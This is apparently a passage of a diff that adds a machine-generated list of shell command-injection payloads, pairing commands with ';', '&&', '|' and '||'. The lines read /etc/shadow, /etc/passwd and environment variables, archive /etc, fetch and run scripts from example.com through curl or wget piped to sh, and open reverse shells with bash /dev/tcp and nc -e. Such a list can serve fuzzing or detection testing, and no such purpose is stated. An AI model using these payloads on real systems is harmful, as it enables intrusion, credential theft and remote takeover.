+cat /var/log/auth.log | /usr/bin/printf 'pwned\n'
+cat /var/log/auth.log || /usr/bin/printf 'pwned\n'
+cat /var/log/auth.log ; chmod +x /tmp/pwned
+cat /var/log/auth.log && chmod +x /tmp/pwned
+cat /var/log/auth.log | chmod +x /tmp/pwned
+cat /var/log/auth.log || chmod +x /tmp/pwned
+cat /var/log/auth.log ; tar -cf /tmp/dump.tar /etc
+cat /var/log/auth.log && tar -cf /tmp/dump.tar /etc
+cat /var/log/auth.log | tar -cf /tmp/dump.tar /etc
+cat /var/log/auth.log || tar -cf /tmp/dump.tar /etc
+cat /var/log/auth.log ; openssl s_client -connect example.com:443
+cat /var/log/auth.log && openssl s_client -connect example.com:443
+cat /var/log/auth.log | openssl s_client -connect example.com:443
+cat /var/log/auth.log || openssl s_client -connect example.com:443
+cat /var/log/auth.log ; ssh localhost id
+cat /var/log/auth.log && ssh localhost id
+cat /var/log/auth.log | ssh localhost id
+cat /var/log/auth.log || ssh localhost id
+cat /var/log/auth.log ; ftp http://example.com/pwn.sh
+cat /var/log/auth.log && ftp http://example.com/pwn.sh
+cat /var/log/auth.log | ftp http://example.com/pwn.sh
+cat /var/log/auth.log || ftp http://example.com/pwn.sh
+env ; id
+env && id
+env | id
+env || id
+env ; uname -a
+env && uname -a
+env | uname -a
+env || uname -a
+env ; whoami
+env && whoami
+env | whoami
+env || whoami
+env ; ls -la /
+env && ls -la /
+env | ls -la /
+env || ls -la /
+env ; ls -la /etc
+env && ls -la /etc
+env | ls -la /etc
+env || ls -la /etc
+env ; ls -lha /root
+env && ls -lha /root
+env | ls -lha /root
+env || ls -lha /root
+env ; cat /etc/passwd
+env && cat /etc/passwd
+env | cat /etc/passwd
+env || cat /etc/passwd
+env ; cat /etc/shadow
+env && cat /etc/shadow
+env | cat /etc/shadow
+env || cat /etc/shadow
+env ; cat /etc/hosts
+env && cat /etc/hosts
+env | cat /etc/hosts
+env || cat /etc/hosts
+env ; cat /var/log/auth.log
+env && cat /var/log/auth.log
+env | cat /var/log/auth.log
+env || cat /var/log/auth.log
+env ; env
+env && env
+env | env
+env || env
+env ; ps aux
+env && ps aux
+env | ps aux
+env || ps aux
+env ; netstat -tulnp
+env && netstat -tulnp
+env | netstat -tulnp
+env || netstat -tulnp
+env ; mtr -r 127.0.0.1 -c 1
+env && mtr -r 127.0.0.1 -c 1
+env | mtr -r 127.0.0.1 -c 1
+env || mtr -r 127.0.0.1 -c 1
+env ; curl http://example.com/pwn.sh | sh
+env && curl http://example.com/pwn.sh | sh
+env | curl http://example.com/pwn.sh | sh
+env || curl http://example.com/pwn.sh | sh
+env ; wget http://example.com/pwn.sh -O- | sh
+env && wget http://example.com/pwn.sh -O- | sh
+env | wget http://example.com/pwn.sh -O- | sh
+env || wget http://example.com/pwn.sh -O- | sh
+env ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+env && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+env | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+env || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+env ; nc 127.0.0.1 4444 -e /bin/bash
+env && nc 127.0.0.1 4444 -e /bin/bash
+env | nc 127.0.0.1 4444 -e /bin/bash
+env || nc 127.0.0.1 4444 -e /bin/bash
+env ; python -c 'import os;print(os.listdir("/"))'
+env && python -c 'import os;print(os.listdir("/"))'
+env | python -c 'import os;print(os.listdir("/"))'
+env || python -c 'import os;print(os.listdir("/"))'
+env ; perl -e 'print "pwned"'
+env && perl -e 'print "pwned"'
+env | perl -e 'print "pwned"'
+env || perl -e 'print "pwned"'
+env ; php -r 'system("id");'
+env && php -r 'system("id");'
+env | php -r 'system("id");'
+env || php -r 'system("id");'
+env ; ruby -e 'puts `id`'
+env && ruby -e 'puts `id`'
+env | ruby -e 'puts `id`'
+env || ruby -e 'puts `id`'
+env ; /bin/bash -c 'id'
+env && /bin/bash -c 'id'
+env | /bin/bash -c 'id'
+env || /bin/bash -c 'id'
+env ; /usr/bin/id >/tmp/id.txt
+env && /usr/bin/id >/tmp/id.txt
+env | /usr/bin/id >/tmp/id.txt
+env || /usr/bin/id >/tmp/id.txt
+env ; /bin/echo pwned > /tmp/pwned.txt
+env && /bin/echo pwned > /tmp/pwned.txt
+env | /bin/echo pwned > /tmp/pwned.txt
+env || /bin/echo pwned > /tmp/pwned.txt
+env ; /usr/bin/printf 'pwned\n'
+env && /usr/bin/printf 'pwned\n'
+env | /usr/bin/printf 'pwned\n'
+env || /usr/bin/printf 'pwned\n'
+env ; chmod +x /tmp/pwned
+env && chmod +x /tmp/pwned
+env | chmod +x /tmp/pwned
+env || chmod +x /tmp/pwned
+env ; tar -cf /tmp/dump.tar /etc
+env && tar -cf /tmp/dump.tar /etc
+env | tar -cf /tmp/dump.tar /etc
+env || tar -cf /tmp/dump.tar /etc
+env ; openssl s_client -connect example.com:443
+env && openssl s_client -connect example.com:443
+env | openssl s_client -connect example.com:443
+env || openssl s_client -connect example.com:443
+env ; ssh localhost id
+env && ssh localhost id
+env | ssh localhost id
+env || ssh localhost id
+env ; ftp http://example.com/pwn.sh
+env && ftp http://example.com/pwn.sh
+env | ftp http://example.com/pwn.sh
+env || ftp http://example.com/pwn.sh
+ps aux ; id
+ps aux && id
+ps aux | id
+ps aux || id
+ps aux ; uname -a
+ps aux && uname -a
+ps aux | uname -a
+ps aux || uname -a
+ps aux ; whoami
+ps aux && whoami
+ps aux | whoami
+ps aux || whoami
+ps aux ; ls -la /
+ps aux && ls -la /
+ps aux | ls -la /
+ps aux || ls -la /
+ps aux ; ls -la /etc
+ps aux && ls -la /etc
+ps aux | ls -la /etc
+ps aux || ls -la /etc
+ps aux ; ls -lha /root
+ps aux && ls -lha /root
+ps aux | ls -lha /root
+ps aux || ls -lha /root
+ps aux ; cat /etc/passwd
+ps aux && cat /etc/passwd
+ps aux | cat /etc/passwd
+ps aux || cat /etc/passwd
+ps aux ; cat /etc/shadow
+ps aux && cat /etc/shadow
+ps aux | cat /etc/shadow
+ps aux || cat /etc/shadow
+ps aux ; cat /etc/hosts
+ps aux && cat /etc/hosts
+ps aux | cat /etc/hosts
+ps aux || cat /etc/hosts
+ps aux ; cat /var/log/auth.log
+ps aux && cat /var/log/auth.log
+ps aux | cat /var/log/auth.log
+ps aux || cat /var/log/auth.log
+ps aux ; env
+ps aux && env
+ps aux | env
+ps aux || env
+ps aux ; ps aux
+ps aux && ps aux
+ps aux | ps aux
+ps aux || ps aux
+ps aux ; netstat -tulnp
+ps aux && netstat -tulnp
+ps aux | netstat -tulnp
+ps aux || netstat -tulnp
+ps aux ; mtr -r 127.0.0.1 -c 1
+ps aux && mtr -r 127.0.0.1 -c 1
+ps aux | mtr -r 127.0.0.1 -c 1
+ps aux || mtr -r 127.0.0.1 -c 1
+ps aux ; curl http://example.com/pwn.sh | sh
+ps aux && curl http://example.com/pwn.sh | sh
+ps aux | curl http://example.com/pwn.sh | sh
+ps aux || curl http://example.com/pwn.sh | sh
+ps aux ; wget http://example.com/pwn.sh -O- | sh
+ps aux && wget http://example.com/pwn.sh -O- | sh
+ps aux | wget http://example.com/pwn.sh -O- | sh
+ps aux || wget http://example.com/pwn.sh -O- | sh
+ps aux ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ps aux && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ps aux | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ps aux || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ps aux ; nc 127.0.0.1 4444 -e /bin/bash
+ps aux && nc 127.0.0.1 4444 -e /bin/bash
+ps aux | nc 127.0.0.1 4444 -e /bin/bash
+ps aux || nc 127.0.0.1 4444 -e /bin/bash
+ps aux ; python -c 'import os;print(os.listdir("/"))'
+ps aux && python -c 'import os;print(os.listdir("/"))'
+ps aux | python -c 'import os;print(os.listdir("/"))'
+ps aux || python -c 'import os;print(os.listdir("/"))'
+ps aux ; perl -e 'print "pwned"'
+ps aux && perl -e 'print "pwned"'
+ps aux | perl -e 'print "pwned"'
+ps aux || perl -e 'print "pwned"'
+ps aux ; php -r 'system("id");'
+ps aux && php -r 'system("id");'
+ps aux | php -r 'system("id");'
+ps aux || php -r 'system("id");'
+ps aux ; ruby -e 'puts `id`'
+ps aux && ruby -e 'puts `id`'
+ps aux | ruby -e 'puts `id`'
+ps aux || ruby -e 'puts `id`'
+ps aux ; /bin/bash -c 'id'
+ps aux && /bin/bash -c 'id'
+ps aux | /bin/bash -c 'id'
+ps aux || /bin/bash -c 'id'
+ps aux ; /usr/bin/id >/tmp/id.txt
+ps aux && /usr/bin/id >/tmp/id.txt
+ps aux | /usr/bin/id >/tmp/id.txt
+ps aux || /usr/bin/id >/tmp/id.txt
+ps aux ; /bin/echo pwned > /tmp/pwned.txt
+ps aux && /bin/echo pwned > /tmp/pwned.txt
+ps aux | /bin/echo pwned > /tmp/pwned.txt
+ps aux || /bin/echo pwned > /tmp/pwned.txt
+ps aux ; /usr/bin/printf 'pwned\n'
+ps aux && /usr/bin/printf 'pwned\n'
+ps aux | /usr/bin/printf 'pwned\n'
+ps aux || /usr/bin/printf 'pwned\n'
+ps aux ; chmod +x /tmp/pwned
+ps aux && chmod +x /tmp/pwned
+ps aux | chmod +x /tmp/pwned
+ps aux || chmod +x /tmp/pwned
+ps aux ; tar -cf /tmp/dump.tar /etc
+ps aux && tar -cf /tmp/dump.tar /etc
+ps aux | tar -cf /tmp/dump.tar /etc
+ps aux || tar -cf /tmp/dump.tar /etc
+ps aux ; openssl s_client -connect example.com:443
+ps aux && openssl s_client -connect example.com:443
+ps aux | openssl s_client -connect example.com:443
+ps aux || openssl s_client -connect example.com:443
+ps aux ; ssh localhost id
+ps aux && ssh localhost id
+ps aux | ssh localhost id
+ps aux || ssh localhost id
+ps aux ; ftp http://example.com/pwn.sh
+ps aux && ftp http://example.com/pwn.sh
+ps aux | ftp http://example.com/pwn.sh
+ps aux || ftp http://example.com/pwn.sh
+netstat -tulnp ; id
+netstat -tulnp && id
+netstat -tulnp | id
+netstat -tulnp || id
+netstat -tulnp ; uname -a
+netstat -tulnp && uname -a
+netstat -tulnp | uname -a
+netstat -tulnp || uname -a
+netstat -tulnp ; whoami
+netstat -tulnp && whoami
+netstat -tulnp | whoami
+netstat -tulnp || whoami
+netstat -tulnp ; ls -la /
+netstat -tulnp && ls -la /
+netstat -tulnp | ls -la /
+netstat -tulnp || ls -la /
+netstat -tulnp ; ls -la /etc
+netstat -tulnp && ls -la /etc
+netstat -tulnp | ls -la /etc
+netstat -tulnp || ls -la /etc
+netstat -tulnp ; ls -lha /root
+netstat -tulnp && ls -lha /root
+netstat -tulnp | ls -lha /root
+netstat -tulnp || ls -lha /root
+netstat -tulnp ; cat /etc/passwd
+netstat -tulnp && cat /etc/passwd
+netstat -tulnp | cat /etc/passwd
+netstat -tulnp || cat /etc/passwd
+netstat -tulnp ; cat /etc/shadow
+netstat -tulnp && cat /etc/shadow
+netstat -tulnp | cat /etc/shadow
+netstat -tulnp || cat /etc/shadow
+netstat -tulnp ; cat /etc/hosts
+netstat -tulnp && cat /etc/hosts
+netstat -tulnp | cat /etc/hosts
+netstat -tulnp || cat /etc/hosts
+netstat -tulnp ; cat /var/log/auth.log
+netstat -tulnp && cat /var/log/auth.log
+netstat -tulnp | cat /var/log/auth.log
+netstat -tulnp || cat /var/log/auth.log
+netstat -tulnp ; env
+netstat -tulnp && env
+netstat -tulnp | env
+netstat -tulnp || env
+netstat -tulnp ; ps aux
+netstat -tulnp && ps aux
+netstat -tulnp | ps aux
+netstat -tulnp || ps aux
+netstat -tulnp ; netstat -tulnp
+netstat -tulnp && netstat -tulnp
+netstat -tulnp | netstat -tulnp
+netstat -tulnp || netstat -tulnp
+netstat -tulnp ; mtr -r 127.0.0.1 -c 1
+netstat -tulnp && mtr -r 127.0.0.1 -c 1
+netstat -tulnp | mtr -r 127.0.0.1 -c 1
+netstat -tulnp || mtr -r 127.0.0.1 -c 1
+netstat -tulnp ; curl http://example.com/pwn.sh | sh
+netstat -tulnp && curl http://example.com/pwn.sh | sh
+netstat -tulnp | curl http://example.com/pwn.sh | sh
+netstat -tulnp || curl http://example.com/pwn.sh | sh
+netstat -tulnp ; wget http://example.com/pwn.sh -O- | sh
+netstat -tulnp && wget http://example.com/pwn.sh -O- | sh
+netstat -tulnp | wget http://example.com/pwn.sh -O- | sh
+netstat -tulnp || wget http://example.com/pwn.sh -O- | sh
+netstat -tulnp ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+netstat -tulnp && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+netstat -tulnp | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+netstat -tulnp || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+netstat -tulnp ; nc 127.0.0.1 4444 -e /bin/bash
+netstat -tulnp && nc 127.0.0.1 4444 -e /bin/bash
+netstat -tulnp | nc 127.0.0.1 4444 -e /bin/bash
+netstat -tulnp || nc 127.0.0.1 4444 -e /bin/bash
+netstat -tulnp ; python -c 'import os;print(os.listdir("/"))'
+netstat -tulnp && python -c 'import os;print(os.listdir("/"))'
+netstat -tulnp | python -c 'import os;print(os.listdir("/"))'
+netstat -tulnp || python -c 'import os;print(os.listdir("/"))'
+netstat -tulnp ; perl -e 'print "pwned"'
+netstat -tulnp && perl -e 'print "pwned"'
+netstat -tulnp | perl -e 'print "pwned"'
+netstat -tulnp || perl -e 'print "pwned"'
+netstat -tulnp ; php -r 'system("id");'
+netstat -tulnp && php -r 'system("id");'
+netstat -tulnp | php -r 'system("id");'
+netstat -tulnp || php -r 'system("id");'
+netstat -tulnp ; ruby -e 'puts `id`'
+netstat -tulnp && ruby -e 'puts `id`'
+netstat -tulnp | ruby -e 'puts `id`'
+netstat -tulnp || ruby -e 'puts `id`'
+netstat -tulnp ; /bin/bash -c 'id'
+netstat -tulnp && /bin/bash -c 'id'
+netstat -tulnp | /bin/bash -c 'id'
+netstat -tulnp || /bin/bash -c 'id'
+netstat -tulnp ; /usr/bin/id >/tmp/id.txt
+netstat -tulnp && /usr/bin/id >/tmp/id.txt
+netstat -tulnp | /usr/bin/id >/tmp/id.txt
+netstat -tulnp || /usr/bin/id >/tmp/id.txt
+netstat -tulnp ; /bin/echo pwned > /tmp/pwned.txt
+netstat -tulnp && /bin/echo pwned > /tmp/pwned.txt
+netstat -tulnp | /bin/echo pwned > /tmp/pwned.txt
+netstat -tulnp || /bin/echo pwned > /tmp/pwned.txt
+netstat -tulnp ; /usr/bin/printf 'pwned\n'
+netstat -tulnp && /usr/bin/printf 'pwned\n'
+netstat -tulnp | /usr/bin/printf 'pwned\n'
+netstat -tulnp || /usr/bin/printf 'pwned\n'
+netstat -tulnp ; chmod +x /tmp/pwned
+netstat -tulnp && chmod +x /tmp/pwned
+netstat -tulnp | chmod +x /tmp/pwned
+netstat -tulnp || chmod +x /tmp/pwned
+netstat -tulnp ; tar -cf /tmp/dump.tar /etc
+netstat -tulnp && tar -cf /tmp/dump.tar /etc
+netstat -tulnp | tar -cf /tmp/dump.tar /etc
+netstat -tulnp || tar -cf /tmp/dump.tar /etc
+netstat -tulnp ; openssl s_client -connect example.com:443
+netstat -tulnp && openssl s_client -connect example.com:443
+netstat -tulnp | openssl s_client -connect example.com:443
+netstat -tulnp || openssl s_client -connect example.com:443
+netstat -tulnp ; ssh localhost id
+netstat -tulnp && ssh localhost id
+netstat -tulnp | ssh localhost id
+netstat -tulnp || ssh localhost id
+netstat -tulnp ; ftp http://example.com/pwn.sh
+netstat -tulnp && ftp http://example.com/pwn.sh
+netstat -tulnp | ftp http://example.com/pwn.sh
+netstat -tulnp || ftp http://example.com/pwn.sh
+mtr -r 127.0.0.1 -c 1 ; id
+mtr -r 127.0.0.1 -c 1 && id
+mtr -r 127.0.0.1 -c 1 | id
+mtr -r 127.0.0.1 -c 1 || id
+mtr -r 127.0.0.1 -c 1 ; uname -a
+mtr -r 127.0.0.1 -c 1 && uname -a
+mtr -r 127.0.0.1 -c 1 | uname -a
+mtr -r 127.0.0.1 -c 1 || uname -a
+mtr -r 127.0.0.1 -c 1 ; whoami
+mtr -r 127.0.0.1 -c 1 && whoami
+mtr -r 127.0.0.1 -c 1 | whoami
+mtr -r 127.0.0.1 -c 1 || whoami
+mtr -r 127.0.0.1 -c 1 ; ls -la /
+mtr -r 127.0.0.1 -c 1 && ls -la /
+mtr -r 127.0.0.1 -c 1 | ls -la /
+mtr -r 127.0.0.1 -c 1 || ls -la /
+mtr -r 127.0.0.1 -c 1 ; ls -la /etc
+mtr -r 127.0.0.1 -c 1 && ls -la /etc
+mtr -r 127.0.0.1 -c 1 | ls -la /etc
+mtr -r 127.0.0.1 -c 1 || ls -la /etc
+mtr -r 127.0.0.1 -c 1 ; ls -lha /root
+mtr -r 127.0.0.1 -c 1 && ls -lha /root
+mtr -r 127.0.0.1 -c 1 | ls -lha /root
+mtr -r 127.0.0.1 -c 1 || ls -lha /root
+mtr -r 127.0.0.1 -c 1 ; cat /etc/passwd
+mtr -r 127.0.0.1 -c 1 && cat /etc/passwd
+mtr -r 127.0.0.1 -c 1 | cat /etc/passwd
+mtr -r 127.0.0.1 -c 1 || cat /etc/passwd
+mtr -r 127.0.0.1 -c 1 ; cat /etc/shadow
+mtr -r 127.0.0.1 -c 1 && cat /etc/shadow
+mtr -r 127.0.0.1 -c 1 | cat /etc/shadow
+mtr -r 127.0.0.1 -c 1 || cat /etc/shadow
+mtr -r 127.0.0.1 -c 1 ; cat /etc/hosts
+mtr -r 127.0.0.1 -c 1 && cat /etc/hosts
+mtr -r 127.0.0.1 -c 1 | cat /etc/hosts
+mtr -r 127.0.0.1 -c 1 || cat /etc/hosts
+mtr -r 127.0.0.1 -c 1 ; cat /var/log/auth.log
+mtr -r 127.0.0.1 -c 1 && cat /var/log/auth.log
+mtr -r 127.0.0.1 -c 1 | cat /var/log/auth.log
+mtr -r 127.0.0.1 -c 1 || cat /var/log/auth.log
+mtr -r 127.0.0.1 -c 1 ; env
+mtr -r 127.0.0.1 -c 1 && env
+mtr -r 127.0.0.1 -c 1 | env
+mtr -r 127.0.0.1 -c 1 || env
+mtr -r 127.0.0.1 -c 1 ; ps aux
+mtr -r 127.0.0.1 -c 1 && ps aux
+mtr -r 127.0.0.1 -c 1 | ps aux
+mtr -r 127.0.0.1 -c 1 || ps aux
+mtr -r 127.0.0.1 -c 1 ; netstat -tulnp
+mtr -r 127.0.0.1 -c 1 && netstat -tulnp
+mtr -r 127.0.0.1 -c 1 | netstat -tulnp
+mtr -r 127.0.0.1 -c 1 || netstat -tulnp
+mtr -r 127.0.0.1 -c 1 ; mtr -r 127.0.0.1 -c 1
+mtr -r 127.0.0.1 -c 1 && mtr -r 127.0.0.1 -c 1
+mtr -r 127.0.0.1 -c 1 | mtr -r 127.0.0.1 -c 1
+mtr -r 127.0.0.1 -c 1 || mtr -r 127.0.0.1 -c 1
+mtr -r 127.0.0.1 -c 1 ; curl http://example.com/pwn.sh | sh
+mtr -r 127.0.0.1 -c 1 && curl http://example.com/pwn.sh | sh
+mtr -r 127.0.0.1 -c 1 | curl http://example.com/pwn.sh | sh
+mtr -r 127.0.0.1 -c 1 || curl http://example.com/pwn.sh | sh
+mtr -r 127.0.0.1 -c 1 ; wget http://example.com/pwn.sh -O- | sh
+mtr -r 127.0.0.1 -c 1 && wget http://example.com/pwn.sh -O- | sh
+mtr -r 127.0.0.1 -c 1 | wget http://example.com/pwn.sh -O- | sh
+mtr -r 127.0.0.1 -c 1 || wget http://example.com/pwn.sh -O- | sh
+mtr -r 127.0.0.1 -c 1 ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+mtr -r 127.0.0.1 -c 1 && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+mtr -r 127.0.0.1 -c 1 | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+mtr -r 127.0.0.1 -c 1 || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+mtr -r 127.0.0.1 -c 1 ; nc 127.0.0.1 4444 -e /bin/bash
+mtr -r 127.0.0.1 -c 1 && nc 127.0.0.1 4444 -e /bin/bash
+mtr -r 127.0.0.1 -c 1 | nc 127.0.0.1 4444 -e /bin/bash
+mtr -r 127.0.0.1 -c 1 || nc 127.0.0.1 4444 -e /bin/bash
+mtr -r 127.0.0.1 -c 1 ; python -c 'import os;print(os.listdir("/"))'
+mtr -r 127.0.0.1 -c 1 && python -c 'import os;print(os.listdir("/"))'
+mtr -r 127.0.0.1 -c 1 | python -c 'import os;print(os.listdir("/"))'
+mtr -r 127.0.0.1 -c 1 || python -c 'import os;print(os.listdir("/"))'
+mtr -r 127.0.0.1 -c 1 ; perl -e 'print "pwned"'
+mtr -r 127.0.0.1 -c 1 && perl -e 'print "pwned"'
+mtr -r 127.0.0.1 -c 1 | perl -e 'print "pwned"'
+mtr -r 127.0.0.1 -c 1 || perl -e 'print "pwned"'
+mtr -r 127.0.0.1 -c 1 ; php -r 'system("id");'
+mtr -r 127.0.0.1 -c 1 && php -r 'system("id");'
+mtr -r 127.0.0.1 -c 1 | php -r 'system("id");'
+mtr -r 127.0.0.1 -c 1 || php -r 'system("id");'
+mtr -r 127.0.0.1 -c 1 ; ruby -e 'puts `id`'
+mtr -r 127.0.0.1 -c 1 && ruby -e 'puts `id`'
+mtr -r 127.0.0.1 -c 1 | ruby -e 'puts `id`'
+mtr -r 127.0.0.1 -c 1 || ruby -e 'puts `id`'
+mtr -r 127.0.0.1 -c 1 ; /bin/bash -c 'id'
+mtr -r 127.0.0.1 -c 1 && /bin/bash -c 'id'
+mtr -r 127.0.0.1 -c 1 | /bin/bash -c 'id'
+mtr -r 127.0.0.1 -c 1 || /bin/bash -c 'id'
+mtr -r 127.0.0.1 -c 1 ; /usr/bin/id >/tmp/id.txt
+mtr -r 127.0.0.1 -c 1 && /usr/bin/id >/tmp/id.txt
+mtr -r 127.0.0.1 -c 1 | /usr/bin/id >/tmp/id.txt
+mtr -r 127.0.0.1 -c 1 || /usr/bin/id >/tmp/id.txt
+mtr -r 127.0.0.1 -c 1 ; /bin/echo pwned > /tmp/pwned.txt
+mtr -r 127.0.0.1 -c 1 && /bin/echo pwned > /tmp/pwned.txt
+mtr -r 127.0.0.1 -c 1 | /bin/echo pwned > /tmp/pwned.txt
+mtr -r 127.0.0.1 -c 1 || /bin/echo pwned > /tmp/pwned.txt
+mtr -r 127.0.0.1 -c 1 ; /usr/bin/printf 'pwned\n'
+mtr -r 127.0.0.1 -c 1 && /usr/bin/printf 'pwned\n'
+mtr -r 127.0.0.1 -c 1 | /usr/bin/printf 'pwned\n'
+mtr -r 127.0.0.1 -c 1 || /usr/bin/printf 'pwned\n'
+mtr -r 127.0.0.1 -c 1 ; chmod +x /tmp/pwned
+mtr -r 127.0.0.1 -c 1 && chmod +x /tmp/pwned
+mtr -r 127.0.0.1 -c 1 | chmod +x /tmp/pwned
+mtr -r 127.0.0.1 -c 1 || chmod +x /tmp/pwned
+mtr -r 127.0.0.1 -c 1 ; tar -cf /tmp/dump.tar /etc
+mtr -r 127.0.0.1 -c 1 && tar -cf /tmp/dump.tar /etc
+mtr -r 127.0.0.1 -c 1 | tar -cf /tmp/dump.tar /etc
+mtr -r 127.0.0.1 -c 1 || tar -cf /tmp/dump.tar /etc
+mtr -r 127.0.0.1 -c 1 ; openssl s_client -connect example.com:443
+mtr -r 127.0.0.1 -c 1 && openssl s_client -connect example.com:443
+mtr -r 127.0.0.1 -c 1 | openssl s_client -connect example.com:443
+mtr -r 127.0.0.1 -c 1 || openssl s_client -connect example.com:443
+mtr -r 127.0.0.1 -c 1 ; ssh localhost id
+mtr -r 127.0.0.1 -c 1 && ssh localhost id
+mtr -r 127.0.0.1 -c 1 | ssh localhost id
+mtr -r 127.0.0.1 -c 1 || ssh localhost id
+mtr -r 127.0.0.1 -c 1 ; ftp http://example.com/pwn.sh
+mtr -r 127.0.0.1 -c 1 && ftp http://example.com/pwn.sh
+mtr -r 127.0.0.1 -c 1 | ftp http://example.com/pwn.sh
+mtr -r 127.0.0.1 -c 1 || ftp http://example.com/pwn.sh
+curl http://example.com/pwn.sh | sh ; id
+curl http://example.com/pwn.sh | sh && id
+curl http://example.com/pwn.sh | sh | id
+curl http://example.com/pwn.sh | sh || id
+curl http://example.com/pwn.sh | sh ; uname -a
+curl http://example.com/pwn.sh | sh && uname -a
+curl http://example.com/pwn.sh | sh | uname -a
+curl http://example.com/pwn.sh | sh || uname -a
+curl http://example.com/pwn.sh | sh ; whoami
+curl http://example.com/pwn.sh | sh && whoami
+curl http://example.com/pwn.sh | sh | whoami
+curl http://example.com/pwn.sh | sh || whoami
+curl http://example.com/pwn.sh | sh ; ls -la /
+curl http://example.com/pwn.sh | sh && ls -la /
+curl http://example.com/pwn.sh | sh | ls -la /
+curl http://example.com/pwn.sh | sh || ls -la /
+curl http://example.com/pwn.sh | sh ; ls -la /etc
+curl http://example.com/pwn.sh | sh && ls -la /etc
+curl http://example.com/pwn.sh | sh | ls -la /etc
+curl http://example.com/pwn.sh | sh || ls -la /etc
+curl http://example.com/pwn.sh | sh ; ls -lha /root
+curl http://example.com/pwn.sh | sh && ls -lha /root
+curl http://example.com/pwn.sh | sh | ls -lha /root
+curl http://example.com/pwn.sh | sh || ls -lha /root
+curl http://example.com/pwn.sh | sh ; cat /etc/passwd
+curl http://example.com/pwn.sh | sh && cat /etc/passwd
+curl http://example.com/pwn.sh | sh | cat /etc/passwd
+curl http://example.com/pwn.sh | sh || cat /etc/passwd
+curl http://example.com/pwn.sh | sh ; cat /etc/shadow
+curl http://example.com/pwn.sh | sh && cat /etc/shadow
+curl http://example.com/pwn.sh | sh | cat /etc/shadow
+curl http://example.com/pwn.sh | sh || cat /etc/shadow
+curl http://example.com/pwn.sh | sh ; cat /etc/hosts
+curl http://example.com/pwn.sh | sh && cat /etc/hosts
+curl http://example.com/pwn.sh | sh | cat /etc/hosts
+curl http://example.com/pwn.sh | sh || cat /etc/hosts
+curl http://example.com/pwn.sh | sh ; cat /var/log/auth.log
+curl http://example.com/pwn.sh | sh && cat /var/log/auth.log
+curl http://example.com/pwn.sh | sh | cat /var/log/auth.log
+curl http://example.com/pwn.sh | sh || cat /var/log/auth.log
+curl http://example.com/pwn.sh | sh ; env
+curl http://example.com/pwn.sh | sh && env
+curl http://example.com/pwn.sh | sh | env
+curl http://example.com/pwn.sh | sh || env
+curl http://example.com/pwn.sh | sh ; ps aux
+curl http://example.com/pwn.sh | sh && ps aux
+curl http://example.com/pwn.sh | sh | ps aux
+curl http://example.com/pwn.sh | sh || ps aux
+curl http://example.com/pwn.sh | sh ; netstat -tulnp
+curl http://example.com/pwn.sh | sh && netstat -tulnp
+curl http://example.com/pwn.sh | sh | netstat -tulnp
+curl http://example.com/pwn.sh | sh || netstat -tulnp
+curl http://example.com/pwn.sh | sh ; mtr -r 127.0.0.1 -c 1
+curl http://example.com/pwn.sh | sh && mtr -r 127.0.0.1 -c 1
+curl http://example.com/pwn.sh | sh | mtr -r 127.0.0.1 -c 1
+curl http://example.com/pwn.sh | sh || mtr -r 127.0.0.1 -c 1
+curl http://example.com/pwn.sh | sh ; curl http://example.com/pwn.sh | sh
+curl http://example.com/pwn.sh | sh && curl http://example.com/pwn.sh | sh
+curl http://example.com/pwn.sh | sh | curl http://example.com/pwn.sh | sh
+curl http://example.com/pwn.sh | sh || curl http://example.com/pwn.sh | sh
+curl http://example.com/pwn.sh | sh ; wget http://example.com/pwn.sh -O- | sh
+curl http://example.com/pwn.sh | sh && wget http://example.com/pwn.sh -O- | sh
+curl http://example.com/pwn.sh | sh | wget http://example.com/pwn.sh -O- | sh
+curl http://example.com/pwn.sh | sh || wget http://example.com/pwn.sh -O- | sh
+curl http://example.com/pwn.sh | sh ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+curl http://example.com/pwn.sh | sh && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+curl http://example.com/pwn.sh | sh | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+curl http://example.com/pwn.sh | sh || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+curl http://example.com/pwn.sh | sh ; nc 127.0.0.1 4444 -e /bin/bash
+curl http://example.com/pwn.sh | sh && nc 127.0.0.1 4444 -e /bin/bash
+curl http://example.com/pwn.sh | sh | nc 127.0.0.1 4444 -e /bin/bash
+curl http://example.com/pwn.sh | sh || nc 127.0.0.1 4444 -e /bin/bash
+curl http://example.com/pwn.sh | sh ; python -c 'import os;print(os.listdir("/"))'
+curl http://example.com/pwn.sh | sh && python -c 'import os;print(os.listdir("/"))'
+curl http://example.com/pwn.sh | sh | python -c 'import os;print(os.listdir("/"))'
+curl http://example.com/pwn.sh | sh || python -c 'import os;print(os.listdir("/"))'
+curl http://example.com/pwn.sh | sh ; perl -e 'print "pwned"'
+curl http://example.com/pwn.sh | sh && perl -e 'print "pwned"'
+curl http://example.com/pwn.sh | sh | perl -e 'print "pwned"'
+curl http://example.com/pwn.sh | sh || perl -e 'print "pwned"'
+curl http://example.com/pwn.sh | sh ; php -r 'system("id");'
+curl http://example.com/pwn.sh | sh && php -r 'system("id");'
+curl http://example.com/pwn.sh | sh | php -r 'system("id");'
+curl http://example.com/pwn.sh | sh || php -r 'system("id");'
+curl http://example.com/pwn.sh | sh ; ruby -e 'puts `id`'
+curl http://example.com/pwn.sh | sh && ruby -e 'puts `id`'
+curl http://example.com/pwn.sh | sh | ruby -e 'puts `id`'
+curl http://example.com/pwn.sh | sh || ruby -e 'puts `id`'
+curl http://example.com/pwn.sh | sh ; /bin/bash -c 'id'
